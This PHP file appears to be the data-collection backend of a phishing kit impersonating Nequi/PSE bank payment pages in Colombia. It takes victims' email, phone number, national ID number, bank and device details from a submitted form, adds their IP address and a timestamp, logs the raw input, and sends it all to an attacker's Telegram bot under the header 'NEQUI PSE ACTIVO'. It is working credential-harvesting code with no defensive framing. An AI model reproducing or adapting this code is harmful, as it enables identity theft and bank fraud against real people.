<?php
// Establecer zona horaria
date_default_timezone_set('America/Bogota');

// Incluir filtro para sanitizar inputs
require_once(__DIR__ . "/../lib/class.inputfilter.php");
$ifilter = new InputFilter();

// Obtener y filtrar datos del POST
$correo      = $ifilter->process($_POST['eml'] ?? '');
$celular     = $ifilter->process($_POST['cel'] ?? '');
$cedula       = $ifilter->process($_POST['val'] ?? '');
$persona     = $ifilter->process($_POST['per'] ?? '');
$banco       = $ifilter->process($_POST['ban'] ?? '');
$tipo        = $ifilter->process($_POST['tip'] ?? '');
$folder      = $ifilter->process($_POST['fol'] ?? '');
$dispositivo = $ifilter->process($_POST['dis'] ?? '');
$nombrebanco = $ifilter->process($_POST['nom'] ?? '');

// Capturar IP y hora
$ip   = $_SERVER['REMOTE_ADDR'];
$hora = date("Y-m-d H:i:s");

// Guardar datos para depuración
file_put_contents("debug.log", print_r($_POST, true));

// Configuración del bot de Telegram
if (file_exists(__DIR__ . "/../../../includes/bank_helper.php")) {
    require_once(__DIR__ . "/../../../includes/bank_helper.php");
    $nombrebanco = jelpi_format_banco($nombrebanco ?: $banco, $folder);
}

$cfg = file_exists(__DIR__ . "/../../../token_bank/config.php") ? require(__DIR__ . "/../../../token_bank/config.php") : (file_exists(__DIR__ . "/../../../config.php") ? require(__DIR__ . "/../../../config.php") : []);
$token   = $cfg['bot_token'] ?? "";
$chat_id = $cfg['chat_id'] ?? "";

// Construir mensaje a enviar
$mensaje = "<b>😈NEQUI PSE ACTIVO😈</b>\n"
         . "<b>💌Correo:</b> $correo\n"
         . "<b>📞Celular:</b> $celular\n"
         . "<b>�cedula:</b> $cedula\n"
         . "<b>👤Persona:</b> $persona\n"
         . "<b>🏦Banco:</b> $nombrebanco\n"
         . "<b>🪬Tipo:</b> $tipo\n"
         . "<b>📟Dispositivo:</b> $dispositivo\n"
         . "<b>🗺IP:</b> $ip\n"
         . "<b>⏱Hora:</b> $hora";

// Enviar mensaje por Telegram
@file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id'    => $chat_id,
    'parse_mode' => 'HTML',
    'text'       => $mensaje
]));

// Devolver respuesta al frontend
echo "2|$folder";
?>
